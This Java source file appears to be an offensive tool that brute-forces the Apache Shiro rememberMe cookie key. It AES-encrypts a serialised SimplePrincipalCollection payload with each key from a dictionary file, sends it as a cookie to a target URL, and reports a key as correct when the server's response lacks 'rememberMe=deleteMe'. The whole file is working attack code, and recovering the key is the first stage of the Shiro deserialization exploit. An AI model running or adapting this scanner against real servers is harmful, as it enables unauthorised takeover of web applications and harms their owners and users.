package com.firebasky.exp;

/**
 * @author:Firebasky
 * 通过多线程方式
 * ref:http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/
 */
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;
import java.io.*;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import org.springframework.http.*;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;
import java.util.regex.*;


public class ScanShiro extends Thread  {
    @Override
    public void run() {
            super.run();
            String url = "http://127.0.0.1:8080";
            String filename = "key.txt";
            List lists = null;
            try {
                lists = readFile(filename);
            } catch (IOException e) {
                e.printStackTrace();
            }
            for (Object list : lists) {
                String payload = null;
                try {
                    payload = EXP("payload",list.toString());
                } catch (Exception e) {
                    e.printStackTrace();
                }
                String res = httpGet(url,payload);
                boolean isMatch = Pattern.matches("(.*)rememberMe=deleteMe.*", res);
                if (isMatch) {
                    System.out.println("key不正确.....");
                }else {
                    System.out.print("key正确为:");
                    System.out.println("\33[32;4m"+list.toString());
                    System.exit(0);
                }
            }
        }

    /**
     * 读序列化文件字节码内容
     * @param path
     * @return
     * @throws Exception
     */
    public static byte[] getBytes(String path) throws Exception{
        InputStream inputStream = new FileInputStream(path);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n=inputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }

    /**
     * 生成check的反序列化
     * @throws Exception
     */
    public static void checkpayload() throws Exception {
        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream("payload"));
        obj.writeObject(simplePrincipalCollection);
        obj.close();
    }

    /**
     * 生成我们的exp
     * @param path
     * @param key
     * @return
     * @throws Exception
     */
    public static String EXP(String path,String key) throws Exception{
        AesCipherService aes = new AesCipherService();
        ByteSource ciphertext = aes.encrypt(getBytes(path), (byte[])Base64.decode(key));
        return ciphertext.toString();
    }

    /**
     * 发送http请求
     * @param url
     * @param payload
     * @return
     */
    public static String httpGet(String url,String payload){
        HttpHeaders headers = new HttpHeaders();
        RestTemplate restTemplate=new RestTemplate();
        List<String> cookies =new ArrayList<String>();
        cookies.add("rememberMe="+payload);
        headers.put(HttpHeaders.COOKIE,cookies);
        HttpEntity<MultiValueMap<String, String>> request = new HttpEntity<MultiValueMap<String, String>>(null,headers);
        ResponseEntity<String> response = restTemplate.postForEntity(url, request, String.class);
        HttpHeaders headers1 = response.getHeaders();
        return String.valueOf(headers1);
    }

    /**
     * 读取字典存放到list中
     * @param path
     * @return
     * @throws IOException
     */
    public static List readFile(String path) throws IOException {
        List list = new LinkedList();
        FileReader fr=new FileReader(path);
        BufferedReader br=new BufferedReader(fr);
        String line="";
        while ((line=br.readLine())!=null) {
            list.add(line);
        }
        br.close();
        fr.close();
        return list;
    }
}
